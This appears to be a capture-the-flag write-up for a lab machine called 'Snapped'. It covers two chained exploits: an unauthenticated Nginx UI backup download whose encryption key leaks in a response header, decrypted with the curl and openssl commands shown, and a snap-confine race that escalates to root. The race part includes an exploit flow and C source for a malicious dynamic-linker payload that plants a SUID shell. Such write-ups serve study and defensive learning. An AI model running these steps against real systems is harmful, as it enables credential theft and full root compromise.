CVE-2026-27944
Nginx UI Backup Disclosure — The /api/backup endpoint is accessible without authentication and exposes the AES-256-CBC encryption keys in the X-Backup-Security response header. An unauthenticated attacker can download the full system backup and decrypt it immediately, recovering user credentials, session tokens, SSL private keys, and Nginx configurations. Patched in version 2.3.3.
Exploitation curl + openssl
# Download backup with key material
$ curl -v http://admin.snapped.htb/api/backup -o backup.zip
X-Backup-Security: v6MVybpaJJ6L4DE4uQljSAd5JIVgdoyI1Cj7RTyyeV8=:xGJoMQ5IYESLQdSoYcwt3A==

# Decrypt with openssl
$ KEY=$(echo 'v6MVybpaJJ6L4DE4uQljSAd5JIVgdoyI1Cj7RTyyeV8=' | base64 -d | xxd -p -c 0)
$ IV=$(echo 'xGJoMQ5IYESLQdSoYcwt3A==' | base64 -d | xxd -p -c 0)
$ openssl enc -aes-256-cbc -d -in nginx-ui.zip -out dec.zip -K $KEY -iv $IV
CVE-2026-3888
snap-confine / systemd-tmpfiles TOCTOU Race — A race condition in snapd 2.63.1 on Ubuntu 24.04. snap-confine (SUID root) creates a private temp directory at /tmp/.snap for mount mimics. systemd-tmpfiles can delete this directory (4-minute timeout on Snapped). An attacker can recreate it with a malicious ld-linux-x86-64.so.2 payload that executes as root when the next snap sandbox is created.
Exploit Flow 7-phase automated race
# 1. Enter firefox snap sandbox (creates /tmp/.snap)
$ systemd-run --user --scope env -i SNAP_INSTANCE_NAME=firefox \
  /usr/lib/snapd/snap-confine --base core22 \
  snap.firefox.hook.configure /bin/sh -c "cd /tmp; sleep 86400"

# 2. Wait for systemd-tmpfiles cleanup (4m timer)
# 3. Destroy cached mount namespace
# 4. Build .snap + .exchange dirs with librootshell.so as ld-linux
# 5. Race: swap directories when snap-confine processes layout
# 6. Trigger SUID snap-confine → loads poisoned ld-linux
# 7. Payload runs setreuid(0,0) → cp /bin/bash → chmod 04755

# Victory:
$ /var/snap/firefox/common/bash -p
bash-5.1# id

🔑 Backup Decryption (CVE-2026-27944)
CVE-2026-27944 AES-256-CBC backup

The /api/backup endpoint returns an encrypted ZIP archive. The X-Backup-Security response header contains the AES key and IV (base64-encoded, colon-separated).

The archive contains three encrypted files: hash_info.txt, nginx-ui.zip, and nginx.zip. The decrypted nginx-ui.zip extracts to app.ini (config) and database.db (SQLite with user hashes).

bashbackup decryption
$ curl -s http://admin.snapped.htb/api/backup -o backup.zip
$ unzip backup.zip -d backup
inflating: backup/hash_info.txt
inflating: backup/nginx-ui.zip
inflating: backup/nginx.zip

# Extract key material from header
$ KEY="bfa315c9ba5a249e8be03138b90963480779248560768c88d428fb453cb2795f"
$ IV="c46268310e4860448b41d4a861cc2ddc"

# Decrypt
$ openssl enc -aes-256-cbc -d -in backup/nginx-ui.zip -out nginx-ui_dec.zip \
  -K $KEY -iv $IV
$ unzip nginx-ui_dec.zip -d nginx-ui

💀 Privilege Escalation — CVE-2026-3888
CVE-2026-3888 race condition TOCTOU SUID

This exploit leverages a time-of-check/time-of-use race in snap-confine's mount namespace initialization:

How the race works: snap-confine processes a layout definition that references /tmp/.snap/usr/lib/x86_64-linux-gnu for bind-mounts. systemd-tmpfiles can delete /tmp/.snap (configured with a 4-minute age timeout). The exploit rebuilds .snap with a malicious ld-linux-x86-64.so.2 and swaps directories during layout processing, so snap-confine bind-mounts the attacker's payload as root.
Clibrootshell_suid.c — dynamic linker payload
// Replaces ld-linux-x86-64.so.2
// Compile: gcc -nostdlib -static -o librootshell.so librootshell_suid.c
void _start(void) {
    /* setreuid(0, 0) — become root */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x71, %%rax\n"
        "syscall\n"
    );
    /* execve("/tmp/sh", ...) — trigger escape script */
    ...
}
